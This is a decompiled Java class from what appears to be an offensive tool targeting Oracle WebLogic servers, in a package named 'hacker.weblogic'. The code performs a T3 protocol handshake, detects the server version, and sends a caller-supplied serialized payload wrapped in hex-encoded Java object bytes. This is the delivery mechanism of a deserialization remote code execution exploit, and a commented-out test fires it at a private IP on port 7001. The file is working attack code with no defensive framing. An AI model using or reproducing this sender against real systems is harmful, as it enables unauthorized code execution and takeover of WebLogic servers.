package com.mtx.xiatian.hacker.weblogic;
 import java.io.FileInputStream;
 import java.io.InputStream;
 import java.io.OutputStream;
 import java.net.Socket;
 
 public class SendPayload
 {
   public static void Send(String Host, String Port, byte[] Payload)
     throws Exception
   {
/* 16 */     Socket socket = new Socket(Host, Integer.parseInt(Port));
 
/* 18 */     OutputStream data = socket.getOutputStream();
 
/* 21 */     String Header = "t3 " + GetShellWL.Version + "\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n";
/* 22 */     data.write(Header.getBytes());
/* 23 */     data.flush();
 
/* 25 */     int length = -1;
/* 26 */     byte[] a = new byte[10000];
/* 27 */     length = socket.getInputStream().read(a);
 
/* 30 */     byte[] version = new byte[length];
/* 31 */     for (int i = 0; i < length; i++)
     {
/* 33 */       version[i] = a[i];
     }
/* 35 */     String Ret = new String(version);
/* 36 */     if (Ret.indexOf("this server:") >= 0)
     {
/* 38 */       String Version = Ret.split(":")[2].split(" ")[0];
/* 39 */       GetShellWL.Version = Version;
/* 40 */       throw new Exception("正在切换协议版本为:" + Version + "，请重试。");
     }
 
/* 44 */     String DataToSendHeader = "000009f3016501ffffffffffffffff000000710000ea6000000018432ec6a2a63985b5af7d63e64383f42a6d92c9e9af0f9472027973720078720178720278700000000c00000002000000000000000000000001007070707070700000000c00000002000000000000000000000001007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200094900056d616a6f724900056d696e6f7249000b706174636855706461746549000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000";
/* 45 */     String DataToSendFooter = "fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200074900056d616a6f724900056d696e6f7249000b706174636855706461746549000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200094900056d616a6f724900056d696e6f7249000b706174636855706461746549000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c00007870774621000000000000000000093132372e302e312e31000b75732d6c2d627265656e73a53caff10000000700001b59ffffffffffffffffffffffffffffffffffffffffffffffff0078fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c00007870771d018140128134bf427600093132372e302e312e31a53caff1000000000078";
/* 46 */     byte[] DataToSend = Utils.byteMerger(Utils.byteMerger(Utils.hexStringToBytes(DataToSendHeader), Payload), Utils.hexStringToBytes(DataToSendFooter));
 
/* 48 */     data.write(DataToSend);
/* 49 */     data.flush();
   }
 
//   public static void main(String[] args)
//   {
//     try
//     {
///* 57 */       byte[] temp = new byte[500000];
///* 58 */       FileInputStream fi = new FileInputStream("d:/vp.bin");
///* 59 */       int length = fi.read(temp);
///* 60 */       byte[] t = new byte[length];
///* 61 */       for (int i = 0; i < length; i++)
//       {
///* 64 */         t[i] = temp[i];
//       }
// 
///* 68 */       Send("192.168.99.46", "7001", t);
//     }
//     catch (Exception e) {
///* 71 */       e.printStackTrace();
//     }
//   }
 }
